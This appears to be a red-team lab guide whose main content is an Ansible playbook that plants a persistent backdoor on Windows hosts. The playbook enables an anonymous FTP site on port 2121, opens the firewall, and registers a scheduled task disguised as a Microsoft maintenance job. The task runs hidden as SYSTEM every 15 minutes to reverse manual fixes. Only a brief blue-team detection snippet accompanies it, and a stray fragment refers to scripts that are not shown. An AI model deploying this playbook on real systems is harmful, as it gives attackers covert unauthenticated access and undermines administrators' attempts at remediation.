## 1. Environment Setup
Before running the playbooks, ensure your Ansible control node is configured.
Prerequisites
Ansible Version: 2.10+
Collections: community.windows and ansible.windows
Targets: Windows hosts must have WinRM enabled and PowerShell 3.0+ installed.

# Install required collections
ansible-galaxy collection install community.windows
ansible-galaxy collection install ansible.windows

Inventory Configuration (hosts.ini)
Update the IP addresses and credentials for your lab environment:

[windows_targets]
win-lab-01 ansible_host=192.168.1.10
win-lab-02 ansible_host=192.168.1.11

[windows_targets:vars]
ansible_user=Administrator
ansible_password=YourSecurePassword!
ansible_connection=winrm
ansible_winrm_server_cert_validation=ignore

## 2. Red Team Playbook: "Full Persistence"
File: deploy_persistence.yml
Purpose: Installs IIS/FTP, configures an insecure "backdoor" site on port 2121, and creates a hidden scheduled task to revert any manual fixes every 15 minutes
---
- name: Full Spectrum Persistent FTP Simulation
  hosts: windows_targets
  gather_facts: yes
  vars:
    ftp_site_name: "Win_Legacy_Svc"
    ftp_root: "C:\\Windows\\Logs\\FTP_Archive"
    payload_path: "C:\\Windows\\System32\\Tasks_Config.ps1"
    task_name: "Microsoft-Windows-Disk-Maintenance"

  tasks:
    - name: Create Hidden Directory Structure
      ansible.windows.win_file:
        path: "{{ ftp_root }}"
        state: directory

    - name: Install FTP Components (Server/Desktop Logic)
      block:
        - community.windows.win_feature:
            name: [Web-Server, Web-FTP-Server, Web-FTP-Service]
            state: present
          when: ansible_windows_product_type == "Server"
        - community.windows.win_optional_feature:
            name: [IIS-WebServerRole, IIS-FTPServer, IIS-FTPSvc]
            state: enabled
          when: ansible_windows_product_type != "Server"

    - name: Deploy Persistence Payload
      ansible.windows.win_copy:
        dest: "{{ payload_path }}"
        content: |
          Import-Module WebAdministration
          if (!(Get-Website -Name "{{ ftp_site_name }}")) {
              New-WebFtpSite -Name "{{ ftp_site_name }}" -Port 2121 -PhysicalPath "{{ ftp_root }}"
          }
          Start-WebItem "IIS:\Sites\{{ ftp_site_name }}"
          Set-WebConfigurationProperty -Filter "/system.ftpServer/security/authentication/anonymousAuthentication" -Name "enabled" -Value "True" -PSPath "IIS:\" -Location "{{ ftp_site_name }}"
          Set-WebConfigurationProperty -Filter "/system.ftpServer/security/ssl" -Name "controlChannelPolicy" -Value "SslAllow" -PSPath "IIS:\" -Location "{{ ftp_site_name }}"
          if (!(Get-NetFirewallRule -DisplayName "FTP-In" -ErrorAction SilentlyContinue)) {
              New-NetFirewallRule -DisplayName "FTP-In" -LocalPort 2121 -Action Allow -Direction Inbound -Protocol TCP
          }

    - name: Create Scheduled Task (Persistence)
      community.windows.win_scheduled_task:
        name: "{{ task_name }}"
        executable: powershell.exe
        arguments: -ExecutionPolicy Bypass -WindowStyle Hidden -File "{{ payload_path }}"
        time_trigger:
          start_boundary: '2024-01-01T00:00:00'
          repetition:
            interval: PT15M
        state: present
        username: SYSTEM
        run_level: highest

(ONLY FOR BLUE TEAM IF NECCESSARY)
## 3. Blue Team: Verification & Cleanup
Detection Script (PowerShell)
Blue Teamers can run this locally to identify the persistence mechanism:
# Check for the obfuscated task
Get-ScheduledTask -TaskName "Microsoft-Windows-Disk-Maintenance"

# Check for the non-standard listener
Get-NetTCPConnection -LocalPort 2121


{
How to use init_lab.sh

Edit the top four variables (TARGET_IP, WIN_USER, etc.) to match
Run the script:

Bash
chmod +x init_lab.sh
./init_lab.sh
Important Note for Windows 7
Since Windows 7 is quite old, it often blocks WinRM by default. If your win_ping fails, run this command locally on the Windows 7 machine inside an Administrator PowerShell window to "open the gate" for your Ansible script:

PowerShell
winrm quickconfig -q; Set-ExecutionPolicy RemoteSigned -Force
}


## How to Run
Deploy: ansible-playbook -i hosts.ini deploy_persistence.yml
Verify: Check port 2121 or attempt anonymous login.
Remediate: ansible-playbook -i hosts.ini cleanup_breach.yml
